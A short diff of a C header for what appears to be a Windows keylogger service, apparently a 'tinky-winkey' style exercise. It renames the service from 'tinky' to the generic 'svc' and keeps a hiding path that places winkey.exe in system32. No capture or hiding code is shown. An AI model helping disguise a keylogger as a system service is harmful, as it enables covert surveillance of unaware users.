@@ -11,7 +11,7 @@
 
 // =============== Magic variables ========== //
 #define WINKEY_STOP TEXT("Global\\stop_winkey_process")  // NameSpace Global ?
-#define SVC_NAME TEXT("tinky")
+#define SVC_NAME TEXT("svc")
 #define KYLG_NAME TEXT("winkey")
 #define HIDING_PATH TEXT("C:\\Windows\\system32\\winkey.exe")
 // global {
@@ -27,7 +27,6 @@
 // ============================================= //
 
 // =============== Structs =============== //
-//#pragma pack(1)
 typedef struct tinky {
 	// install {
 	SC_HANDLE	scmHandler;
@@ -49,7 +48,6 @@ typedef struct tinky {
 	PROCESS_INFORMATION		processInfo;
 	// }
 }	tinky_t;
-//#pragma pack()
 // ============================================= //
 
 // =============== cmdLineControlManaged.cpp =============== //
